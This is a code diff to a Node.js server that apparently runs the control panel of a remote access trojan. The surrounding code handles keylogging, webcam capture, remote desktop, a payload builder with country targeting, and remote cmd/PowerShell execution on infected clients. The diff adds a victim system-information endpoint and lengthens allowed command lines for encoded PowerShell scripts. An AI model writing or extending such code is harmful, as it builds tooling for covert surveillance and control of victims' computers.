@@ -17,6 +17,7 @@ import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, ge
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { countriesFor } from './builder/geo.js';
+import { runSysinfo } from './builder/sysinfo.js'; // NEW
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -94,7 +95,6 @@ app.use('/api/client/upload', express.raw({
   limit: CFG.maxUpload,
 }));
 
-// file manager uploads go through /exec — larger body than the global 256kb limit
 const jsonSmall = express.json({ limit: '256kb' });
 const jsonExec  = express.json({ limit: '32mb' });
 app.use((req, res, next) => {
@@ -117,7 +117,8 @@ const limitGlobal = limit({
     req.path.endsWith('/rdp/update') ||
     req.path.endsWith('/rdp/stop') ||
     req.path.endsWith('/webcam/stop') ||
-    req.path.endsWith('/keylog/stop'),
+    req.path.endsWith('/keylog/stop') ||
+    req.path.endsWith('/sysinfo'),
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
@@ -396,7 +397,8 @@ app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell', 'file'].includes(shell))
     return res.status(400).json({ error: 'bad shell' });
-  const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 8192;
+  // NEW: allow long powershell/cmd lines for encoded sysinfo scripts
+  const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 65536;
   if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
     return res.status(400).json({ error: 'bad line' });
 
@@ -419,6 +421,21 @@ app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
     ORDER BY created_at DESC LIMIT 100
   `).all(req.user.uid, clientId);
   res.json(rows);
+});
+
+// NEW: system snapshot — cpu/gpu/ram + top processes
+app.get('/api/clients/:id/sysinfo', requireAuth, async (req, res) => {
+  const clientId = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+
+  try {
+    const data = await runSysinfo(clientId, req.user.uid);
+    res.json(data);
+  } catch (e) {
+    console.error('[sysinfo]', e);
+    res.status(500).json({ ok: false, error: e.message || 'sysinfo failed' });
+  }
 });
 
 app.delete('/api/clients/:id', requireAuth, (req, res) => {
